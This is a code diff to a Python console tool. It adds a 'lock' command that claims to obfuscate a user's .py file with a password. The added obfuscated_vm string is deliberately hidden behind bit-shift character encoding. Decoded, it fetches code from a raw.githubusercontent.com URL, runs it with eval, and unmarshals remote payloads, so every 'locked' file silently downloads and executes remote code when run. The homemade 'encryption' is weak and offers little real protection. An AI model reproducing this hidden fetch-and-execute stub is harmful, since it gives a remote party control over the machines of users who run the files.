@@ -1,8 +1,97 @@
 out=['','','','','','','','','','','']
 offset=0
+obfuscated_vm="(__:=lambda _:bytearray(_).decode(),(___:=__import__,____:=chr,a:=__([(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<5)+(1<<4)+(1<<3)+(1<<1),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)]),b:=lambda _:eval(___(__([(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0)])).get(_).text),c:=lambda _:___(__([(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)])).loads(bytes.fromhex(__([]).join(_))),e:=[c(b(f'{a}/hex{_}'))for(_)in[(1<<2)+(1<<1)+(1<<0),(1<<3),(1<<3)+(1<<0),(1<<3)+(1<<1),(1<<2)+(1<<1)]],(f:=lambda:__([]),g:={0:(1<<0),(1<<0):(__([]),),(1<<1):b''.join(b(f'{a}/vm')),(1<<1)+(1<<0):(None,*map(ord,__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<0)])),*sum(([x,__([])]for(x)in e[:-1]),[]),-4,(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),-1,(1<<2)+(1<<1)+(1<<0),__([(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<1)+(1<<0),____(35),__([]).join(map(____,[(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<3)])),(1<<6)+(1<<5)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<0),(1<<0)-1,(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),__([(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0)]),e[(1<<2)],__([]),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),__([]),(1<<6)+(1<<5)+(1<<3)+(1<<1),(1<<6)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<3)),(1<<2):(1<<1)+(1<<0),(1<<2)+(1<<0):(__([(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0)]),__([(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<1)]),__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]),__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)])),(1<<2)+(1<<1):(1<<4)+(1<<2)+(1<<0),(1<<2)+(1<<1)+(1<<0):(1<<3)+(1<<1)+(1<<0),(1<<3):(____((1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)),)*((1<<1)+(1<<0))},type(f)(f.__code__.replace(**{i:g[h]for h,i in enumerate(tuple(_ for(_)in dir(f.__code__)if(_[(1<<1)]==(__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]))and _[(1<<1)+(1<<0)]in(__([(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)]))and _[((1<<1)+(1<<0)):((1<<2)+(1<<0))]not in[(__([(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<0)])),(__([(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)]))]and _[-((1<<1)):]!=(__([(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0)])))))}),globals(),__([])))[(1<<1)])[-((1<<0))]('***'))";
+
+import tkinter as tk
+from tkinter import filedialog
+import math, random, marshal, pyperclip
+
+def copy_to_clipboard(text):
+    pyperclip.copy(text)
+
+def fixed_length_password(length, point):
+    if length <= point: return length
+    else: return length % point or point
+
+def generate_characters_from_password(password, length):
+    fixed = []
+
+    for character in list( (password * length)[:length] ):
+        session_seed = ord(character) * 678
+        random_session = random.Random(session_seed)
+        random_number = random_session.randint(457, 875)
+        character = chr(random_number)
+
+        fixed.append(character)
+
+    return fixed
+
+def encrypt(string, password):
+    characters = []
+    generated_characters = generate_characters_from_password(password, 7)
+    password_length = len(password)
+    reversed_password_first_char_ascii = ord(password[::-1][0])
+
+    for i, char in enumerate(string):
+        string_character_ascii = ord(char)
+        password_character_ascii = ord(password[fixed_length_password(i + 1, password_length) - 1])
+
+        encrypted_char = chr(string_character_ascii + password_character_ascii + reversed_password_first_char_ascii)
+        characters.append(encrypted_char)
+
+    obfuscated_characters = ''.join(
+        char + (random.choice(generated_characters) if random.random() > 0.5 else '')
+        for char in characters
+    )
+
+    scrambled_hexes = ''.join(
+        hex(ord(char))[2:] + random.choice('ghijklmno')
+        for char in obfuscated_characters
+    )
+
+    scrambled_hexes = scrambled_hexes[:-1]
+    final_string = scrambled_hexes.upper()[::-1] + random.choice('pqrstuv').upper() + str(random.randint(137, 975))
+
+    return final_string
+
+def serialize_code_object(code_obj):
+    return marshal.dumps(code_obj).hex()
+
+def load_and_compile_python_file(file_path):
+    with open(file_path, 'r') as file:
+        source_code = file.read()
+    code_object = compile(source_code, file_path, 'exec')
+    return code_object
+
+def encrypt_file(file_path, password):
+    code_obj = load_and_compile_python_file(file_path)
+    serialized_code = serialize_code_object(code_obj)
+    return encrypt(serialized_code, password)
+
+def select_file():
+    root = tk.Tk()
+    root.withdraw()
+    file_path = filedialog.askopenfilename(title="Select a Python file", filetypes=[("Python Files", "*.py")])
+
+    return file_path
+
+def obfuscate_file(password):
+	selected_file = select_file()
+	encrypted_code = encrypt_file(selected_file, password)
+	locked_file = open('\\'.join((sd:=selected_file.split('/'),l:=sd[-1],sd.remove(l))[0])+'\\'+l.replace('.','_locked.'),'w')
+	locked_file.write(obfuscated_vm.replace('***',encrypted_code))
+	locked_file.close()
+	return ('\\'.join((sd:=selected_file.split('/'),l:=sd[-1],sd.remove(l))[0])+'\\'+l.replace('.','_locked.')).split('\\')[-1]
+
 commands = {
-	'help': (lambda: (
-		out.append(f'[~] : help'),
+	'lock': (lambda password: (
+		out.append(f'[~]: lock {password}'),
+		out.append('    successfully obfuscated program!'),
+		out.append('    saved as: ' + obfuscate_file(password))
+	)),
+
+	'commands': (lambda: (
+		out.append(f'[~] : commands'),
 		out.append('    =           : scrolls up'),
 		out.append('    -           : scrolls down'),
 		out.append('    clear       : clears the console'),
@@ -15,7 +104,24 @@ commands = {
 		out.append('                  ass / pussy / thigh / boobs'),
 		out.append('    exec        : opens a code editor where you\'re'),
 		out.append('                  able to execute 10 lines of code'),
-		out.append('                  at a time')
+		out.append('                  at a time'),
+		out.append('    lock [pwd]  : obfuscates any .py file with the'),
+		out.append('                  given password, this will bring up'),
+		out.append('                  a file selector prompt where you'),
+		out.append('                  pick your file of choice.')
+	)),
+
+	'help': (lambda: (
+		out.append(f'[~] : help'),
+		out.append('    ; / \'       : scrolls up / down'),
+		out.append('    clear       : clears the console'),
+		out.append('    lock [pwd]  : obfuscates any .py file with the'),
+		out.append('                  given password, this will bring up'),
+		out.append('                  a file selector prompt where you'),
+		out.append('                  pick your file of choice.'),
+		out.append('    exec        : opens a code editor where you\'re'),
+		out.append('                  able to execute 10 lines of code'),
+		out.append('                  at a time'),
 	)),
 
 	'img': (lambda img_type, amount = 1: (
@@ -77,11 +183,11 @@ commands = {
 		])),commands['buffer'](),
 	)),
 
-	'-': (lambda : (
+	'\'': (lambda : (
 		globals().__setitem__('offset', offset-1)
 	)),
 
-	'=': (lambda : (
+	';': (lambda : (
 		globals().__setitem__('offset', offset+1)
 	)),
 }
